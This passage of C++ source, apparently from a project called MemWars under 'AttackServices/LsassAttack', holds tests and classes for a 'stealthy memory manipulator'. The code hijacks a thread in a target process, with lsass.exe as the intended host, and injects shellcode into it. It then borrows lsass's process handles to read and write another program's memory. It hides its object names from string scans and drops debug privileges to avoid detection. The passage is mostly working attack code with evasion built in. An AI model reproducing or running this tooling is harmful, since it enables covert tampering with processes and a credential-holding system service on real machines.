    if (smi.InstanceAlreadyRunning()) {
        cout << "SMMInstall_InstanceAlreadyRunningTest() failed. " 
        << "Instance is running even though we didn't create it." << endl;
        CloseHandle(smi.getHGlobalMutex());
        return;
    }

    if (!smi.InstanceAlreadyRunning()) {
        cout << "SMMInstall_InstanceAlreadyRunningTest() failed. " 
        << "Instance is not running even though we just created it." << endl;
        return;
    }

    if (!CloseHandle(smi.getHGlobalMutex())) {
        cout << "SMMInstall_InstanceAlreadyRunningTest() failed. " 
        << "Could not close Mutex HANDLE" << endl;
        return;
    }
    
    cout << "SMMInstall_InstanceAlreadyRunningTest() success" << endl;
}

void GetPIDsOfProcessTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "GetPIDsOfProcessTest() failed" << endl;
    } else {
        cout << "GetPIDsOfProcessTest() success" << endl;
    }
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void SMMInstall_FindUnusedExecutableMemoryTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    StealthyMemInstaller smi;
    vector<wstring> dummy;
    smi.Init(dummy);
    // smi.Init(L"lsass.exe");
    vector<UNUSED_EXECUTABLE_MEM> availableExecutableMem = smi.FindExecutableMemory(process, TRUE);

    if (availableExecutableMem.empty()) {
        cout << "SMMInstall_FindUnusedExecutableMemoryTest() failed" << endl;
    } else {
        cout << "SMMInstall_FindUnusedExecutableMemoryTest() success" << endl;
    }
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void GetModulesNamesAndBaseAddressesTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "GetModulesNamesAndBaseAddressesTest() failed. PID not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    map<wstring, DWORD64> modsStartAddrs = GetModulesNamesAndBaseAddresses(pids[0]);

    if (modsStartAddrs.empty()) {
        cout << "GetModulesNamesAndBaseAddressesTest() failed" << endl;
    } else {
        cout << "GetModulesNamesAndBaseAddressesTest() success" << endl;
    }
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void GetTIDChronologicallyTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "GetTIDChronologicallyTest() failed. PID not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    vector<DWORD> tids = GetTIDChronologically(pids[0]);

    if (tids.empty()) {
        cout << "GetTIDChronologicallyTest() failed" << endl;
    } else {
        cout << "GetTIDChronologicallyTest() success" << endl;
    }
    system("taskkill /IM memoryTestApp.exe /F >nul");
}



void GetThreadsStartAddressesTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "GetThreadsStartAddressesTest() failed. PID not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    vector<DWORD> tids = GetTIDChronologically(pids[0]);

    if (tids.empty()) {
        cout << "GetThreadsStartAddressesTest() failed. TID not found" << endl;
    }

    map<DWORD, DWORD64> threadStartAddresses = GetThreadsStartAddresses(tids);
    if (threadStartAddresses.empty()) {
        cout << "GetThreadsStartAddressesTest() failed" << endl;
    } else {
        cout << "GetThreadsStartAddressesTest() success" << endl;
    }

    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void GetTIDsModuleStartAddrTest() {
    
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "GetTIDsModuleStartAddrTest() failed. PID not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }

    map<DWORD, wstring> tidStartAddresses = GetTIDsModuleStartAddr(pids[0]);

    if (tidStartAddresses.empty()) {
        cout << "GetTIDsModuleStartAddrTest() failed" << endl;
    } else {
        cout << "GetTIDsModuleStartAddrTest() success" << endl;
    }

    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void SMMInstall_ShellcodeHijackedThreadFileMappingTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    preferedThreadModuleNames.push_back(L"memoryTestApp.exe");
    smi.Init(preferedThreadModuleNames, L"memoryTestApp.exe");

    if (!SetProcessPrivilege(SE_DEBUG_NAME, TRUE)) {
        cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: Privilege failed." << endl;
        goto Exit;
    }
	
	if (!smi.GetTargetProcessPID()) {
        cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: GetTargetProcessPID failed." << endl;
        goto Exit;
    }

    if (!smi.GetTargetProcessHandle()) {
		cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: GetTargetProcessHandle failed." << endl;
        goto Exit;
	}

    if (!smi.GetRemoteExecutableMemory()) {
		cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: GetRemoteExecutableMemory failed." << endl;
        goto Exit;
	}
	
	if (!smi.FindUsableTID()) {
		cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: FindUsableTID failed." << endl;
		goto Exit;
	}

	if (!smi.CreateSharedFileMapping()) {
		cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: CreateSharedFileMapping failed." << endl;
		goto Exit;
    }
    
    if (!smi.InjectFileMappingShellcodeIntoTargetThread()) {
        cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() failed: InjectFileMappingShellcodeIntoTargetThread failed." << endl;
		goto Exit;
    }

    cout << "SMMInstall_ShellcodeHijackedThreadFileMappingTest() success" << endl;

    Exit:;
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void SMMInstall_InstallTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    // preferedThreadModuleNames.push_back(L"samsrv.dll");
    // preferedThreadModuleNames.push_back(L"msvcrt.dll");
    // preferedThreadModuleNames.push_back(L"crypt32.dll");
    // smi.Init(preferedThreadModuleNames, L"lsass.exe");
    preferedThreadModuleNames.push_back(L"memoryTestApp.exe");
    smi.Init(preferedThreadModuleNames, L"memoryTestApp.exe");
    if (!smi.Install()) {
        cout << "SMMInstall_InstallTest() failed" << endl;
        goto Exit;
    }
    
    cout << "SMMInstall_InstallTest() success" << endl;
    Exit:;
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void SMMClient_InitTest() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }
    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    preferedThreadModuleNames.push_back(L"memoryTestApp.exe");
    smi.Init(preferedThreadModuleNames, L"memoryTestApp.exe");
    if (!smi.Install()) {
        cout << "SMMClient_InitTest() failed. Installer failed" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }

    StealthyMemClient smc;
    if (!smc.Init(L"memoryTestApp.exe")) {
        cout << "SMMClient_InitTest() failed" << endl;
        goto Exit;
    }

    cout << "SMMClient_InitTest() success" << endl;

    Exit:;
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

void SMMClient_ReadWriteMemoryWithLsass() {

    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)GetProcessByName("SkypeApp.exe");
        if (process == NULL) {
            cout << "Open Skype to start testing..." << endl;
            Sleep(5000);
        }
    }
    
    StealthyMemInstaller smi;
    vector<wstring> preferedThreadModuleNames;
    preferedThreadModuleNames.push_back(L"samsrv.dll");
    preferedThreadModuleNames.push_back(L"msvcrt.dll");
    preferedThreadModuleNames.push_back(L"crypt32.dll");
    smi.Init(preferedThreadModuleNames, L"lsass.exe");
    // if (!smi.Install()) {
    //     cout << "SMMClient_ReadMemoryTest() failed. Installer failed" << endl;
    //     return;
    // }

    StealthyMemClient smc;
    if (!smc.Init(L"lsass.exe")) {
        cout << "SMMClient_ReadMemoryTest() failed. Init failed" << endl;
        return;
    }

    MEMPTRS ptrBuf = {0};
    BYTEARRAY bArr = {0};
    IntToByteArray(&bArr, 25);
    FindValueInProcess(&bArr, process, &ptrBuf);

    if (ptrBuf.size <= 0) {
        cout << "SMMClient_ReadMemoryTest() failed. Val in TestApp not found." << endl;
        return;
    }
    if (!smc.SetTargetProcessHandle(L"SkypeApp.exe")) {
        // Reminder: lsass.exe does not have handles to all processes. Only to processes that do networking.
        cout << "SMMClient_ReadMemoryTest() failed. Could not get Handle" << endl;
        return;
    }

    cout << (uint64_t*)ptrBuf.memPointerArray[0] << endl;

    BYTEARRAY bArr1 = {0};
    SIZE_T bytesReadBuf = 0;
    smc.ReadVirtualMemory(ptrBuf.memPointerArray[0], bArr1.values, sizeof(int), &bytesReadBuf);
    bArr1.size = sizeof(int);
    if (!ValueIsMatching(&bArr, &bArr1)) {
        cout << "SMMClient_ReadMemoryTest() failed. ReadVirtualMemory failed" << endl;
        return;
    }

    BYTEARRAY bArr2 = {0};
    IntToByteArray(&bArr2, 123456);
    smc.WriteVirtualMemory(ptrBuf.memPointerArray[0], bArr2.values, sizeof(int), &bytesReadBuf);

    BYTEARRAY bArr3 = {0};
    ReadProcessMemoryAtPtrLocation(ptrBuf.memPointerArray[0], sizeof(int), process, &bArr3);
    bArr3.size = sizeof(int);
    if (!ValueIsMatching(&bArr2, &bArr3)) {
        cout << "SMMClient_ReadMemoryTest() failed. WriteVirtualMemory failed" << endl;
    } else {
        cout << "SMMClient_ReadMemoryTest() success" << endl;
    }
}

int main() {
    // GetPIDsOfProcessTest();
    // GetModulesNamesAndBaseAddressesTest();
    // GetTIDChronologicallyTest();
    // GetThreadsStartAddressesTest();
    // GetTIDsModuleStartAddrTest();
    // SMMInstall_CreateSharedFileMappingTest();
    // SMMInstall_InstanceAlreadyRunningTest();
    // SMMInstall_FindUnusedExecutableMemoryTest();
    // SMMInstall_ShellcodeHijackedThreadFileMappingTest();
    
    // cannot run InstallTest() in combination with other tests because of Mutexes
    // SMMInstall_InstallTest(); // need to restart explorer.exe after this test because of the handle to the file mapping in explorer.exe
    // SMMClient_InitTest(); // need to restart explorer.exe after this test because of the handle to the file mapping in explorer.exe
    SMMClient_ReadWriteMemoryWithLsass();
    
}
```

`AttackServices/LsassAttack/StealthyMemManipulatorClient.cpp`:

```cpp
#include <iostream>
#include <string>
#include <algorithm>
// #include <iostream> // for debugging, remove later
#include "StealthyMemManipulatorClient.h"
#include "StealthyMemManipulatorGetHandleId.h"

using namespace std;

BOOL StealthyMemClient::Init(wstring pivotProcessName) {
    
    // if (InstanceAlreadyRunning()) {
        // cout << "StealthyMemClient::InstanceAlreadyRunning failed" << endl;
        // return FALSE;
    // }

	if (!SetPivotProcess(pivotProcessName)) {
        // cout << "StealthyMemClient::SetPivotProcess failed" << endl;
        return FALSE;
    }
    
    if (!ConnectToFileMapping()) {
        // cout << "StealthyMemClient::ConnectToFileMapping failed" << endl;
        return FALSE;
    }
    
	return Reconnect();
}

// BOOL StealthyMemClient::InstanceAlreadyRunning() {
//     string e = "";
// 	string mutexNoStr = e+'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M'+'M'+'t'+'x';
// 	m_hMutex = CreateMutexA(NULL, TRUE, mutexNoStr.c_str());
// 	if (GetLastError() == ERROR_ALREADY_EXISTS) {
//         // exit(EXIT_FAILURE);
//         return TRUE;
//     }
//     return FALSE;
// }

BOOL StealthyMemClient::SetPivotProcess(wstring pivotProcessName) {
	vector<DWORD> pidsLsass = GetPIDs(pivotProcessName);
	if (pidsLsass.empty()) {
        return FALSE;
    }
	sort(pidsLsass.begin(), pidsLsass.end());
	m_pivotPID = pidsLsass[0];
	if (!m_pivotPID) {
        return FALSE;
    }
    return TRUE;
}

BOOL StealthyMemClient::ConnectToFileMapping() {
    string e = "";
	string sharedMemNameNoStr = e+'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M';
	hSharedMem = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, sharedMemNameNoStr.c_str());
	if (!hSharedMem) {
        return FALSE;
    }
    return TRUE;
}


vector<DWORD> StealthyMemClient::GetPIDs(wstring targetProcessName) {
	vector<DWORD> pids;
	if (targetProcessName == L"") {
        return pids;
    }
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(entry);
	if (!Process32FirstW(snap, &entry)) {
        return pids;
    }
	do {
		if (wstring(entry.szExeFile) == targetProcessName) {
			pids.emplace_back(entry.th32ProcessID);
		}
	} while (Process32NextW(snap, &entry));
	return pids;
}

BOOL StealthyMemClient::Reconnect() {
    if (!hSharedMem) {
        return FALSE;
    }
        
    // Remapping shared memory
    m_ptrLocalSharedMem = MapViewOfFile(hSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, SHARED_MEM_SIZE);
    CloseHandle(hSharedMem);
    if (!m_ptrLocalSharedMem) {
        return FALSE;
    }
    
    // Restoring variables from backup in shared memory
    _SHARED_MEM_INFO cfgBackup;
    void* endOfUsableLocalSharedMem = (void*)((DWORD64)m_ptrLocalSharedMem + SHARED_MEM_SIZE - sizeof(_REMOTE_COMMAND_INFO));
    void* backupAddrInSharedMem = (void*)((DWORD64)endOfUsableLocalSharedMem - sizeof(_SHARED_MEM_INFO));
    CopyMemory(&cfgBackup, backupAddrInSharedMem, sizeof(cfgBackup));

    // consistency check
    if (!cfgBackup.ptrRemoteSharedMem || 
        !cfgBackup.sharedMemSize || 
        !cfgBackup.remoteExecMem || 
        !cfgBackup.remoteExecMemSize || 
        cfgBackup.sharedMemSize != SHARED_MEM_SIZE
    ) {
        return FALSE;
    }
    // m_usableSharedMemSize = cfgBackup.sharedMemSize - sizeof(_SHARED_MEM_INFO);
    m_usableSharedMemSize = cfgBackup.sharedMemSize - sizeof(_SHARED_MEM_INFO) - sizeof(_REMOTE_COMMAND_INFO);

    ptrRemoteSharedMem = cfgBackup.ptrRemoteSharedMem;

    return TRUE;
}

NTSTATUS StealthyMemClient::ReadWriteVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* nBytesReadOrWritten, BOOL read) {
    if (!lpBuffer || !lpBaseAddress || !nSize || nSize >= m_usableSharedMemSize || !m_hHiJack) {
        return (NTSTATUS)0xFFFFFFFF;
    }

    // memset(m_ptrLocalSharedMem, 0, m_usableSharedMemSize); // setting mem to zero

    // Preparing order structure
    _REMOTE_COMMAND_INFO rpmOrder;
    rpmOrder.hProcess = m_hHiJack;
    rpmOrder.lpBaseAddress = (DWORD64)lpBaseAddress;
    rpmOrder.nSize = nSize;
    // rpmOrder.nBytesReadOrWritten = nBytesReadOrWritten;
    rpmOrder.nBytesReadOrWritten = (SIZE_T*)((DWORD64)ptrRemoteSharedMem + SHARED_MEM_SIZE - sizeof(rpmOrder) + sizeof(DWORD64) +
    sizeof(DWORD) + sizeof(NTSTATUS) + sizeof(HANDLE) + sizeof(DWORD64) + sizeof(SIZE_T));


    // For write operations, changing order and placing data to write in shared memory
    if (!read) {
        rpmOrder.order = 1;
        CopyMemory(m_ptrLocalSharedMem, lpBuffer, nSize);
    }

    // Pushing parameters
    void* controlLocalAddr = (void*)((DWORD64)m_ptrLocalSharedMem + SHARED_MEM_SIZE - sizeof(rpmOrder));
    CopyMemory(controlLocalAddr, &rpmOrder, sizeof(rpmOrder));

    // Triggering execution and waiting for completion with the configured synchronisation method
    BYTE exec = 0;
    CopyMemory(controlLocalAddr, &exec, sizeof(exec));
    SpinLockByte(controlLocalAddr, 1);
    // Moving from shared memory to lpBuffer and returning
    if (read) {
        CopyMemory(lpBuffer, m_ptrLocalSharedMem, nSize);
    }

    *nBytesReadOrWritten =  *(SIZE_T*)((DWORD64)m_ptrLocalSharedMem + SHARED_MEM_SIZE - sizeof(rpmOrder) + sizeof(DWORD64) +
    sizeof(DWORD) + sizeof(NTSTATUS) + sizeof(HANDLE) + sizeof(DWORD64) + sizeof(SIZE_T));


    return rpmOrder.status;
}

BOOL StealthyMemClient::SetTargetProcessHandle(wstring targetProcessName) {
    m_hHiJack = GetHandleToId(targetProcessName, m_pivotPID);
    
    if (!m_hHiJack) {
        return FALSE;
    }
    return TRUE;
}

NTSTATUS StealthyMemClient::ReadVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead) {
    return ReadWriteVirtualMemory(lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead, TRUE);
}

NTSTATUS StealthyMemClient::WriteVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) {
    return ReadWriteVirtualMemory(lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten, FALSE);
}


BOOL StealthyMemClient::Disconnect() {
	if (m_ptrLocalSharedMem) {
        UnmapViewOfFile(m_ptrLocalSharedMem);
    }
	return TRUE;
}

StealthyMemClient::~StealthyMemClient() {
	Disconnect();
}
```

`AttackServices/LsassAttack/StealthyMemManipulatorClient.h`:

```h
/*
*
*
* The client only uses specific MemWars libraries since we dont want any strings in the binary
*/


#ifndef _STEALTHY_MEM_MANIPULATOR_CLIENT_H
#define _STEALTHY_MEM_MANIPULATOR_CLIENT_H

// #define SHARED_MEM_SIZE 4096
#define SHARED_MEM_SIZE 100000000 // 100mb

#include <windows.h>
#include <vector>
#include <TlHelp32.h>

using namespace std;

extern "C" void SpinLockByte(volatile void* byteAddr, volatile BYTE valueExit);

struct _REMOTE_COMMAND_INFO {
	DWORD64 exec = 1; // Least significant byte used to release the spinlock
	DWORD order = 0; // 0: Read, 1: Write
	NTSTATUS status = 0x1;//0xFFFFFFFF; // USAGE UNUSED MIGHT BE ADDED IN FUTURE
	HANDLE hProcess = NULL;
	DWORD64 lpBaseAddress = NULL;
	SIZE_T nSize = 0;
	SIZE_T* nBytesReadOrWritten = 0;
}; // Important: Must be 8 bytes aligned, otherwise garbage data is added in the structure

struct _SHARED_MEM_INFO {
	SIZE_T remoteExecMemSize = NULL;
	void* remoteExecMem = nullptr;
	SIZE_T sharedMemSize = NULL;
	void* ptrRemoteSharedMem = nullptr;
};

class StealthyMemClient {
public:
    // StealthyMemClient();
	~StealthyMemClient();
    BOOL Init(wstring pivotProcessName);
    // BOOL InstanceAlreadyRunning();
    BOOL SetPivotProcess(wstring pivotProcessName);
    BOOL ConnectToFileMapping();
    vector<DWORD> GetPIDs(wstring targetProcessName);
    BOOL Reconnect();
    BOOL Disconnect();
    BOOL SetTargetProcessHandle(wstring targetProcessName);

    NTSTATUS ReadWriteVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* nBytesReadOrWritten, BOOL read);
    NTSTATUS WriteVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
    NTSTATUS ReadVirtualMemory(void* lpBaseAddress, void* lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);

    SIZE_T GetUsableSharedMemSize() {
        return m_usableSharedMemSize;
    }
    // for debugging
    HANDLE GetTargetHandle() {
        return m_hHiJack;
    }

protected:
    HANDLE m_hMutex = NULL;
    DWORD m_pivotPID = NULL;
    void* m_ptrLocalSharedMem = nullptr;
    SIZE_T m_usableSharedMemSize = NULL;
    HANDLE m_hHiJack = NULL;
    HANDLE hSharedMem = NULL;
    void* ptrRemoteSharedMem = nullptr;
};


#endif
```

`AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.cpp`:

```cpp
#include "StealthyMemManipulatorGetHandleId.h"
// for debugging, remove alter
#include <iostream>
using namespace std;
//debugging end
 
 
/* This function finds a handle to a process from its name.
It can also find handles to a process belonging to other processes.
Important: Does NOT return a valid HANDLE, it only returns the Handle ID */
HANDLE GetHandleToId(std::wstring targetProcessName, DWORD pidOwner) {
	if (targetProcessName == L"") {
		return (HANDLE)0x0; // Trying to get a handle to an empty process name
	}
		
 
	if (!SetPrivilege(SE_DEBUG_NAME)) {
		return (HANDLE)0x0;
	}
 
	if (pidOwner == NULL) {
		// No owner PID for the handle specified, assuming we are looking for a handle belonging to this program
		pidOwner = GetCurrentProcessId();
	} 
 
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PVOID buffer = NULL;
	ULONG buffersize = 0;
	while (true) {
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SYSTEMHANDLEINFORMATION, buffer, buffersize, &buffersize);
		if (!NT_SUCCESS(status)) {
			if (status == STATUS_INFO_LENGTH_MISMATCH) {
				if (buffer != NULL) {
					VirtualFree(buffer, 0, MEM_RELEASE);
				}
				buffer = VirtualAlloc(NULL, buffersize, MEM_COMMIT, PAGE_READWRITE);
			}
			continue;
		}
		else {
			break;
		}
	}
 
	// Enumerate all handles on system
	PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
 
	PVOID buffer2 = NULL;
	ULONG buffersize2 = 0;
	for (ULONG i = 0; i < handleInfo->HandleCount; i++) {
		PSYSTEM_HANDLE_TABLE_ENTRY_INFO Handle = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleInfo->Handles[i];
		if (!Handle) {
			continue;
		}
		if (!Handle->HandleValue) {
			continue; // Error, empty handle value
		}
		if (Handle->UniqueProcessId != pidOwner) {
			continue; // The handle doesn't belong to the owner we target
		}
 
		HANDLE localHandle = (HANDLE)Handle->HandleValue;
		if (pidOwner != GetCurrentProcessId()) {
			// Only if trying to get handle from another process (OpenProcess + DuplicateHandle)
			HANDLE hProcessHandleOwner = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pidOwner);
			//BOOL dupStatus = DuplicateHandle(hProcessHandleOwner, HANDLE(Handle->HandleValue), GetCurrentProcess(), &localHandle, PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0); // Can do with normal method instead of using native function
			NTSTATUS dupStatus = NtDuplicateObject(hProcessHandleOwner, HANDLE(Handle->HandleValue), GetCurrentProcess(), &localHandle, PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0);
			CloseHandle(hProcessHandleOwner);
			if (dupStatus != 0) {
				// Couldn't get a handle to get info, will not be able to define if it is a handle to our process, exiting
				continue;
			}
		}
 
		int trys = 0;
		while (true) {
			if (trys == 20) {
				break;
			}
			trys += 1;
 
			/* In rare cases, when a handle has been closed between the snapshot and this NtQueryObject, the handle is not valid at that line.
			This is problematic in system processes with a strict handle policy and can result in process termination, forcing a reboot (Windows 8+) or a BSOD (Windows 7)
			Note that this is not problematic in classic processes. */
			status = NtQueryObject(localHandle, ObjectTypeInformation, buffer2, buffersize2, &buffersize2); // Return objecttypeinfo into buffer
			if (!NT_SUCCESS(status)) {
				if (buffer2 != NULL) {
					// If buffer filled with anything, but call didnt succeed, assume its bullshit, so clear it
					VirtualFree(buffer2, 0, MEM_RELEASE); 
				}
				buffer2 = VirtualAlloc(NULL, buffersize2, MEM_COMMIT, PAGE_READWRITE); // Allocate with new mem
			}
			else {
				if (wcsncmp(((POBJECT_TYPE_INFORMATION)buffer2)->TypeName.Buffer, L"Process", ((POBJECT_TYPE_INFORMATION)buffer2)->TypeName.Length + 1) == 0) {
					wchar_t process[MAX_PATH];
					if (GetModuleFileNameExW(localHandle, NULL, process, MAX_PATH)) {
						std::wstring processname = process;
						int pos = processname.find_last_of(L"\\");
						processname = processname.substr(pos + 1, processname.length());
						if (processname == targetProcessName) {
							HANDLE handleFound = (HANDLE)Handle->HandleValue;
							VirtualFree(buffer, 0, MEM_RELEASE); // Cleanup to avoid leaks
							VirtualFree(buffer2, 0, MEM_RELEASE);
							if (pidOwner != GetCurrentProcessId()) {
								CloseHandle(localHandle);
							}
							SetPrivilege(SE_DEBUG_NAME, FALSE); // Removing special privileges to avoid detection vectors
							return handleFound; // TODO: Improve by returning a vector of handles, there might be several with different access rights
						}
						else {
							break;
						}
					}
				}
				else {
					break;
				}
			}
		}
		if (Handle->UniqueProcessId != GetCurrentProcessId()) {
			CloseHandle(localHandle); // Cleanup
		}
		continue;
	}
	VirtualFree(buffer, 0, MEM_RELEASE); // Empties buffers to avoid memory leaks
	VirtualFree(buffer2, 0, MEM_RELEASE); // Empties buffers to avoid memory leaks
	SetPrivilege(SE_DEBUG_NAME, FALSE);
	return (HANDLE)0x0;
}


bool SetPrivilege(LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	BOOL Status = true;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		Status = false;
		goto EXIT;
	}
	if (!LookupPrivilegeValueA(0, lpszPrivilege, &luid)) {
		Status = false;
		goto EXIT;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)) {
		Status = false;
		goto EXIT;
	}
EXIT:
	if (hToken)
		CloseHandle(hToken);
	return Status;
}
```

`AttackServices/LsassAttack/StealthyMemManipulatorGetHandleId.h`:

```h
#pragma once
#pragma warning( disable:4005 )
#include <windows.h>
#include <Winternl.h>
#include <ntstatus.h>
#include <Psapi.h>
#include <string>
#define SYSTEMHANDLEINFORMATION 16
#pragma comment (lib, "ntdll.lib")
 
typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
 
typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG HandleCount; // Or NumberOfHandles if you prefer
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
 
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	DWORD UniqueProcessId;
	WORD HandleType;
	USHORT HandleValue;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
 
typedef struct _OBJECT_TYPE_INFORMATION {
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	UCHAR TypeIndex;
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;
 
EXTERN_C NTSTATUS NTAPI NtDuplicateObject(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, BOOLEAN, ULONG);
 
bool SetPrivilege(LPCSTR lpszPrivilege, BOOL bEnablePrivilege = TRUE);
 
/* This function finds a handle to a process from its name.
It can also find handles to a process belonging to other processes.
Important: Does NOT return a valid HANDLE, it only returns the Handle ID */
HANDLE GetHandleToId(std::wstring targetProcessName, DWORD pidOwner = NULL);

```

`AttackServices/LsassAttack/StealthyMemManipulatorInstaller.cpp`:

```cpp

#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <Winternl.h>
#include <Psapi.h>
#include <Winnt.h>
#include <string>
#include <algorithm>
#include <vector>
#include <map>
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"
#include "StealthyMemManipulatorInstaller.h"

using namespace std;

BOOL StealthyMemInstaller::Init(vector<wstring> preferedTIDsModules, wstring targetProcessName) {
    // hiding names
    // sharedMemName = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M';
	// globalMutex = 'G'+'l'+'o'+'b'+'a'+'l'+'\\'+'S'+'M'+'e'+'m'+'M'+'M'+'t'+'x';
